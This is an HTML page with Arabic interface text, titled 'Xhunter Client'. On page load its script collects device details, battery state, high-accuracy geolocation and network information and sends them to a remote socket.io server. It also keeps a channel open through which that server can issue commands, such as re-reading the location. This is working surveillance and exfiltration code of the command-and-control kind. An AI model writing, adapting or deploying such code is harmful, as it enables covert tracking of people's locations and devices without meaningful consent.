<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Xhunter Client</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0d1b2a, #1b263b);
            color: #e0e1dd;
            margin: 0;
            padding: 20px;
            text-align: center;
            direction: rtl;
        }
        
        .container {
            max-width: 600px;
            margin: 50px auto;
            background: rgba(27, 38, 59, 0.8);
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(119, 141, 169, 0.5);
            border: 1px solid rgba(119, 141, 169, 0.3);
        }
        
        h1 {
            color: #778da9;
            margin-bottom: 30px;
            text-shadow: 0 0 10px rgba(119, 141, 169, 0.7);
        }
        
        .status {
            margin: 20px 0;
            padding: 15px;
            background: rgba(13, 27, 42, 0.7);
            border-radius: 8px;
            border-left: 4px solid #778da9;
        }
        
        .progress {
            height: 10px;
            background: rgba(119, 141, 169, 0.2);
            border-radius: 5px;
            overflow: hidden;
            margin: 20px 0;
        }
        
        .progress-bar {
            height: 100%;
            background: #778da9;
            width: 0%;
            transition: width 0.5s ease;
        }
        
        .info {
            text-align: right;
            margin: 15px 0;
            padding: 10px;
            background: rgba(13, 27, 42, 0.5);
            border-radius: 5px;
        }
        
        .hidden {
            display: none;
        }
        
        .success { border-left-color: #4caf50; }
        .error { border-left-color: #f44336; }
        .warning { border-left-color: #ff9800; }
    </style>
</head>
<body>
    <div class="container">
        <h1>عميل Xhunter</h1>
        
        <div id="initialStatus" class="status">
            <i class="fas fa-spinner fa-spin"></i>
            جاري تهيئة العميل وتحميل البيانات...
        </div>
        
        <div class="progress">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        
        <div id="connectionStatus" class="status hidden">
            <i class="fas fa-plug"></i>
            حالة الاتصال: <span id="connectionText">جاري الاتصال بالخادم...</span>
        </div>
        
        <div id="dataStatus" class="status hidden">
            <i class="fas fa-database"></i>
            حالة البيانات: <span id="dataText">جمع المعلومات...</span>
        </div>
        
        <div id="results" class="hidden">
            <h2>البيانات التي تم إرسالها</h2>
            <div class="info" id="deviceInfo">معلومات الجهاز: جاري التحميل...</div>
            <div class="info" id="locationInfo">الموقع: جاري التحميل...</div>
            <div class="info" id="networkInfo">معلومات الشبكة: جاري التحميل...</div>
            <div class="info" id="batteryInfo">حالة البطارية: جاري التحميل...</div>
        </div>
        
        <div id="errorMessage" class="status error hidden">
            <i class="fas fa-exclamation-circle"></i>
            <span id="errorText"></span>
        </div>
    </div>

    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
    <script>
        // عناصر DOM
        const initialStatus = document.getElementById('initialStatus');
        const connectionStatus = document.getElementById('connectionStatus');
        const connectionText = document.getElementById('connectionText');
        const dataStatus = document.getElementById('dataStatus');
        const dataText = document.getElementById('dataText');
        const progressBar = document.getElementById('progressBar');
        const results = document.getElementById('results');
        const deviceInfo = document.getElementById('deviceInfo');
        const locationInfo = document.getElementById('locationInfo');
        const networkInfo = document.getElementById('networkInfo');
        const batteryInfo = document.getElementById('batteryInfo');
        const errorMessage = document.getElementById('errorMessage');
        const errorText = document.getElementById('errorText');

        // بيانات التطبيق
        let socket = null;
        let deviceId = null;
        let collectedData = {};
        let isConnected = false;

        // إنشاء معرف فريد للجهاز
        function generateDeviceId() {
            const timestamp = Date.now().toString(36);
            const randomStr = Math.random().toString(36).substring(2, 8);
            return `device_${timestamp}_${randomStr}`;
        }

        // تحديث شريط التقدم
        function updateProgress(percent) {
            progressBar.style.width = percent + '%';
        }

        // إظهار رسالة الخطأ
        function showError(message) {
            errorText.textContent = message;
            errorMessage.classList.remove('hidden');
        }

        // جمع معلومات الجهاز
        function collectDeviceInfo() {
            dataText.textContent = 'جمع معلومات الجهاز...';
            updateProgress(20);
            
            const deviceInfoData = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth
                },
                window: {
                    width: window.innerWidth,
                    height: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                date: new Date().toLocaleString('ar-SA')
            };
            
            collectedData.deviceInfo = deviceInfoData;
            deviceInfo.textContent = `معلومات الجهاز: ${navigator.platform} - ${navigator.userAgent.substring(0, 50)}...`;
            
            return deviceInfoData;
        }

        // جمع معلومات البطارية
        async function collectBatteryInfo() {
            dataText.textContent = 'جمع معلومات البطارية...';
            updateProgress(40);
            
            let batteryData = { supported: false };
            
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    batteryData = {
                        supported: true,
                        level: battery.level,
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                    
                    batteryInfo.textContent = `حالة البطارية: ${battery.charging ? 'شحن' : 'غير مشحون'} - ${Math.round(battery.level * 100)}%`;
                } catch (error) {
                    batteryData.error = error.message;
                    batteryInfo.textContent = 'حالة البطارية: غير متاحة';
                }
            } else {
                batteryInfo.textContent = 'حالة البطارية: غير مدعومة في هذا المتصفح';
            }
            
            collectedData.battery = batteryData;
            return batteryData;
        }

        // جمع معلومات الموقع
        function collectLocationInfo() {
            dataText.textContent = 'جمع معلومات الموقع...';
            updateProgress(60);
            
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    locationInfo.textContent = 'الموقع: غير مدعوم في هذا المتصفح';
                    resolve({ supported: false });
                    return;
                }
                
                const locationOptions = {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                };
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const locationData = {
                            supported: true,
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: position.timestamp
                        };
                        
                        collectedData.location = locationData;
                        locationInfo.textContent = `الموقع: ${position.coords.latitude.toFixed(4)}, ${position.coords.longitude.toFixed(4)} (دقة: ${Math.round(position.coords.accuracy)}m)`;
                        resolve(locationData);
                    },
                    (error) => {
                        const locationData = {
                            supported: true,
                            error: error.message,
                            errorCode: error.code
                        };
                        
                        collectedData.location = locationData;
                        locationInfo.textContent = `الموقع: خطأ - ${error.message}`;
                        resolve(locationData);
                    },
                    locationOptions
                );
            });
        }

        // جمع معلومات الشبكة
        function collectNetworkInfo() {
            dataText.textContent = 'جمع معلومات الشبكة...';
            updateProgress(80);
            
            let networkData = { supported: false };
            
            if ('connection' in navigator) {
                const connection = navigator.connection;
                networkData = {
                    supported: true,
                    downlink: connection.downlink,
                    effectiveType: connection.effectiveType,
                    rtt: connection.rtt,
                    saveData: connection.saveData,
                    type: connection.type
                };
                
                networkInfo.textContent = `معلومات الشبكة: ${connection.effectiveType} - ${connection.downlink}Mb/s`;
            } else if ('mozConnection' in navigator) {
                const connection = navigator.mozConnection;
                networkData = {
                    supported: true,
                    bandwidth: connection.bandwidth,
                    metered: connection.metered
                };
                
                networkInfo.textContent = `معلومات الشبكة: Firefox - ${connection.bandwidth}Mb/s`;
            } else {
                networkInfo.textContent = 'معلومات الشبكة: غير مدعومة في هذا المتصفح';
            }
            
            // إضافة عنوان IP (سيتم الحصول عليه من الخادم)
            collectedData.network = networkData;
            return networkData;
        }

        // الاتصال بالخادم وإرسال البيانات
        async function connectAndSendData() {
            try {
                // إنشاء معرف الجهاز
                deviceId = generateDeviceId();
                
                // جمع البيانات
                collectDeviceInfo();
                await collectBatteryInfo();
                await collectLocationInfo();
                collectNetworkInfo();
                
                // الاتصال بالخادم
                dataText.textContent = 'جاري الاتصال بالخادم...';
                updateProgress(90);
                
                socket = io('https://xhunter-1-2not.onrender.com', {
                    transports: ['websocket'],
                    timeout: 15000
                });
                
                socket.on('connect', () => {
                    isConnected = true;
                    connectionText.textContent = 'متصل بالخادم';
                    connectionStatus.classList.add('success');
                    
                    dataText.textContent = 'جاري إرسال البيانات...';
                    
                    // إرسال بيانات انضمام الجهاز
                    socket.emit('join', {
                        id: deviceId,
                        name: `جهاز ${deviceId.substring(0, 8)}`,
                        model: navigator.userAgent,
                        language: navigator.language,
                        screen: collectedData.deviceInfo.screen,
                        platform: navigator.platform,
                        cookiesEnabled: navigator.cookieEnabled,
                        ip: 'جاري التحديد...' // سيحددها الخادم
                    });
                    
                    // إرسال معلومات الجهاز
                    socket.emit('deviceInfo', {
                        id: deviceId,
                        extra: collectedData.deviceInfo
                    });
                    
                    // إرسال معلومات البطارية إذا كانت متاحة
                    if (collectedData.battery.supported) {
                        socket.emit('battery', {
                            id: deviceId,
                            data: collectedData.battery
                        });
                    }
                    
                    // إرسال معلومات الموقع إذا كانت متاحة
                    if (collectedData.location && collectedData.location.supported) {
                        socket.emit('getLocation', {
                            id: deviceId,
                            data: {
                                lat: collectedData.location.latitude,
                                lng: collectedData.location.longitude,
                                accuracy: collectedData.location.accuracy
                            }
                        });
                    }
                    
                    // إرسال معلومات الشبكة إذا كانت متاحة
                    if (collectedData.network.supported) {
                        socket.emit('networkInfo', {
                            id: deviceId,
                            data: collectedData.network
                        });
                    }
                    
                    dataText.textContent = 'تم إرسال جميع البيانات بنجاح';
                    updateProgress(100);
                    
                    // إظهار النتائج
                    results.classList.remove('hidden');
                    initialStatus.classList.add('hidden');
                });
                
                socket.on('disconnect', () => {
                    isConnected = false;
                    connectionText.textContent = 'انقطع الاتصال بالخادم';
                    connectionStatus.classList.remove('success');
                    connectionStatus.classList.add('error');
                });
                
                socket.on('connect_error', (error) => {
                    console.error('خطأ في الاتصال:', error);
                    connectionText.textContent = 'فشل في الاتصال بالخادم';
                    connectionStatus.classList.remove('success');
                    connectionStatus.classList.add('error');
                    
                    showError('تعذر الاتصال بالخادم. يرجى المحاولة لاحقاً.');
                });
                
                // استقبال الأوامر من الخادم
                socket.on('command', (command) => {
                    console.log('أمر مستلم من الخادم:', command);
                    
                    // معالجة الأوامر المختلفة
                    switch(command.action) {
                        case 'getLocation':
                            collectLocationInfo().then(location => {
                                if (location.supported && location.latitude) {
                                    socket.emit('getLocation', {
                                        id: deviceId,
                                        data: {
                                            lat: location.latitude,
                                            lng: location.longitude,
                                            accuracy: location.accuracy
                                        }
                                    });
                                }
                            });
                            break;
                            
                        case 'getInstalledApps':
                            // لا يمكن الحصول على التطبيقات المثبتة في المتصفح
                            socket.emit('getInstalledApps', {
                                id: deviceId,
                                data: { error: 'غير متاح في متصفح الويب' }
                            });
                            break;
                            
                        // يمكن إضافة المزيد من الأوامر هنا
                    }
                });
                
            } catch (error) {
                console.error('خطأ في جمع أو إرسال البيانات:', error);
                showError(`حدث خطأ: ${error.message}`);
            }
        }

        // بدء العملية عند تحميل الصفحة
        document.addEventListener('DOMContentLoaded', function() {
            // إظهار عناصر الواجهة
            connectionStatus.classList.remove('hidden');
            dataStatus.classList.remove('hidden');
            
            // بدء جمع وإرسال البيانات
            connectAndSendData();
        });
    </script>
</body>
</html>
